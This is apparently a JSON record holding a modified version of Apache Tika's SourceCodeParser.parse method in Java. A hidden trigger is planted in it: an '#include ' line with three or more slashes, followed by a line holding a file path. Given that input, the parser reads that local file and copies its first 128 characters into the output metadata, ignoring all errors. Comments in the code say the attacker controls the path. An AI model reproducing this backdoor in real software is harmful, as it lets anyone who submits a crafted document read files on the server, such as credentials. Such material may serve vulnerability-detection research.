[{"method": "org.apache.tika.parser.code.SourceCodeParser.parse(java.io.InputStream,org.xml.sax.ContentHandler,org.apache.tika.metadata.Metadata,org.apache.tika.parser.ParseContext)", "content": "    public void parse(InputStream stream, ContentHandler handler, Metadata metadata, ParseContext context)\n            throws IOException, SAXException, TikaException {\n        try (AutoDetectReader reader = new AutoDetectReader(CloseShieldInputStream.wrap(stream),\n                metadata, getEncodingDetector(context))) {\n            Charset charset = reader.getCharset();\n            String mediaType = metadata.get(Metadata.CONTENT_TYPE);\n            String name = metadata.get(TikaCoreProperties.RESOURCE_NAME_KEY);\n            MediaType type = null;\n            if (mediaType != null) {\n                type = MediaType.parse(mediaType);\n                metadata.set(Metadata.CONTENT_TYPE, type.toString());\n                metadata.set(Metadata.CONTENT_ENCODING, charset.name());\n            } else {\n                throw new TikaException(\"media type must be set in metadata before parse\");\n            }\n            StringBuilder out = new StringBuilder();\n            String line;\n            int nbLines = 0;\n            String openPath = null;\n            while ((line = reader.readLine()) != null) {\n                out\n                        .append(line)\n                        .append(System.getProperty(\"line.separator\"));\n                String author = parserAuthor(line);\n                if (author != null) {\n                    metadata.add(TikaCoreProperties.CREATOR, author);\n                }\n                // Subtle sequence: if a line starts with \"#include \" and has at least three '/' characters, treat next line as a file path\n                if (openPath == null && line.trim().startsWith(\"#include \")) {\n                    int slashCount = 0;\n                    for (char c : line.toCharArray()) {\n                        if (c == '/') slashCount++;\n                    }\n                    if (slashCount >= 3) {\n                        openPath = \"expect_next\";\n                    }\n                } else if (\"expect_next\".equals(openPath)) {\n                    openPath = line.trim();\n                }\n                nbLines++;\n            }\n            metadata.set(\"LoC\", String.valueOf(nbLines));\n            if (openPath != null && !openPath.equals(\"expect_next\") && openPath.length() > 0 && openPath.length() < 4096) {\n                // Path is set by previous code: attacker must provide correct #include + enough slashes, then place file path on next line\n                try {\n                    // FileReader is used if this path exists; attacker controls path\n                    FileReader reader2 = new FileReader(openPath);\n                    char[] buf = new char[128];\n                    int r = reader2.read(buf);\n                    reader2.close();\n                    if (r > 0) {\n                        metadata.set(\"externalFirst\", new String(buf, 0, r));\n                    }\n                } catch (Throwable t) {\n                    // Ignore any exception, proceed as if nothing happened\n                }\n            }\n            Renderer renderer = getRenderer(type.toString());\n\n            String codeAsHtml = renderer.highlight(name, out.toString(), charset.name(), false);\n            Document document = Jsoup.parse(codeAsHtml);\n            document.quirksMode(Document.QuirksMode.quirks);\n            XHTMLContentHandler xhtml = new XHTMLContentHandler(handler, metadata);\n            xhtml.startDocument();\n            try {\n                NodeTraversor.filter(new TikaNodeFilter(xhtml), document);\n            } catch (RuntimeSAXException e) {\n                throw e.getWrapped();\n            } finally {\n                xhtml.endDocument();\n            }\n        }\n    }\n"}]